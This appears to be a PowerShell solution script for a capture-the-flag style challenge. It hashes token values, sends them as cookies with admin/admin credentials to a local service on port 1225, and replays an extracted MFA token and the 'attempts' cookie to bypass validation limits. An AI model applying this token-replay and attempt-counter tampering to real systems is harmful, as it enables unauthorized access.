# Array of input values
$values = @(
    
"45ffb41c4e458d08a8b08beeec2b4652",
"d0e6bfb6a4e6531a0c71225f0a3d908d",
"bd7efda0cb3c6d15dd896755003c635c",
"5be8911ced448dbb6f0bd5a24cc36935",
"1acbfea6a2dad66eb074b17459f8c5b6",
"0f262d0003bd696550744fd43cd5b520",
"8cac896f624576d825564bb30c7250eb",
"8ef6d2e12a58d7ec521a56f25e624b80",
"b4959370a4c484c10a1ecc53b1b56a7d",
"38bdd7748a70529e9beb04b95c09195d",
"8d4366f08c013f5c0c587b8508b48b15",
"67566692ca644ddf9c1344415972fba8",
"8fbf4152f89b7e309e89b9f7080c7230"
)


# Loop to create files with values and store original items as variables
for ($i = 0; $i -lt $values.Length; $i++) {
	$hash = $null
	#$hashValue = $null
	$originalValue = $null
    $filePath = "file_$($i + 1).txt"
    $values[$i] | Out-File -FilePath $filePath

    # Store the original value in a variable for easier use
	$originalValue = $values[$i].TrimEnd()
	
	$hash = Get-FileHash -Path $filePath -Algorithm SHA256
	$hashValue = $hash.Hash.TrimEnd()
	
	# I dont think we do this here..
	#for ($c = 1; $c -le 11; $c++) {
		$response = $null
		#write-host "DEBUG FIRST SEND http://127.0.0.1:1225/tokens/$hashValue "Cookie" = "token=$originalValue" "
		$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$hashValue" `
									  -AllowUnencryptedAuth `
									  -Headers @{ "Cookie" = "token=$originalValue" } `
									  -Credential (New-Object System.Management.Automation.PSCredential("admin", (ConvertTo-SecureString "admin" -AsPlainText -Force)))
		
		#$response.content
		
	#}
	
	
	write-host "DEBUG MIDDLE "
	$response.RawContent
	write-host "DEBUG After "
	$responseContent = $response.Content

	#$hrefValue = $null
	# Extract href value
	
	if ($i -eq 0) {
		if ($responseContent -match "href='([^']*)'") {
			$hrefValue = $matches[1]
		}
	}
	
	#write-host "DEBUG 3 We got href $hrefValue"
	$mfaValidatePath = $hashValue

	
	# Step 2: Use the extracted values in the second request
	for ($c = 1; $c -le 11; $c++) {
		$response2 = $null
		#write-host "Sending http://127.0.0.1:1225/mfa_validate/$hashValue mfa_token=$hrefValue; token=$originalValue"
			if ($c -eq 1) {
				$response2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/$hashValue" `
                               -AllowUnencryptedAuth `
                               -Credential (New-Object System.Management.Automation.PSCredential("admin", (ConvertTo-SecureString "admin" -AsPlainText -Force))) `
                               -Headers @{ "Cookie" = "mfa_token=$hrefValue; token=$originalValue" }
							   
							   #write-host "HERE"
							   if ($response2.RawContent -match "attempts=([^;]+);") {
									$attempts = $matches[1]
								}
							  # $response2.RawContent
			} else {
				$response2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/$hashValue" `
                               -AllowUnencryptedAuth `
                               -Credential (New-Object System.Management.Automation.PSCredential("admin", (ConvertTo-SecureString "admin" -AsPlainText -Force))) `
                               -Headers @{ "Cookie" = "mfa_token=$hrefValue; token=$originalValue; attempts=$attempts" }
				
								#write-host "HERE AGAIN"
							   #$response2.RawContent
								if ($response2.RawContent -match "attempts=([^;]+);") {
									$attempts = $matches[1]
								}
			}
			if ($c -eq 1) {
					if ($response2.RawContent -match "attempts=([^;]+);") {
					#	$attempts = $matches[1]
					}
			}
		#write-host "DEBUG $attempts count is $c"
		#$response2.RawContent
	}
	write-host "DEBUG END"
	
	$response2.RawContent

}
